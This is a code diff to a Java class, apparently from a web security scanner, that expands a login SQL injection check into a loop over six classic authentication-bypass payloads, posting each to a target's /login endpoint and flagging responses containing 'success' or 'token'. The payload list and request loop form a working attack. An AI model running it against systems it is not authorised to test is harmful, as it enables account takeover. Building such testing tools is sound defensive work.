@@ -7,17 +7,41 @@ public class SqlInjectionAttack {
 
     public static AttackResult run(String baseUrl) {
 
-        String payload = """
-        {
-          "username": "' OR 1=1 --",
-          "password": "anything"
+        String[] payloads = {
+            "' OR 1=1 --",
+            "' OR '1'='1",
+            "admin' --",
+            "' OR 1=1#",
+            "1' OR '1' = '1",
+            "' UNION SELECT NULL--"
+        };
+
+        for (String injection : payloads) {
+            String payload = String.format("""
+            {
+              "username": "%s",
+              "password": "anything"
+            }
+            """, injection);
+
+            String response = HttpUtil.post(baseUrl + "/login", payload);
+
+            if (response.contains("success") || response.contains("token") || 
+                response.contains("authenticated")) {
+                
+                String details = String.format("SQL injection successful using payload: '%s'. Response: %s", 
+                    injection, truncate(response, 150));
+                    
+                return new AttackResult("SQL Injection", true, details);
+            }
         }
-        """;
 
-        String response = HttpUtil.post(baseUrl + "/login", payload);
+        return new AttackResult("SQL Injection", false, 
+            "No SQL injection vulnerability detected. Tested " + payloads.length + " payloads");
+    }
 
-        boolean vulnerable = response.contains("success") || response.contains("token");
-
-        return new AttackResult("SQL Injection", vulnerable, response);
+    private static String truncate(String str, int maxLength) {
+        if (str.length() <= maxLength) return str;
+        return str.substring(0, maxLength) + "...";
     }
 }
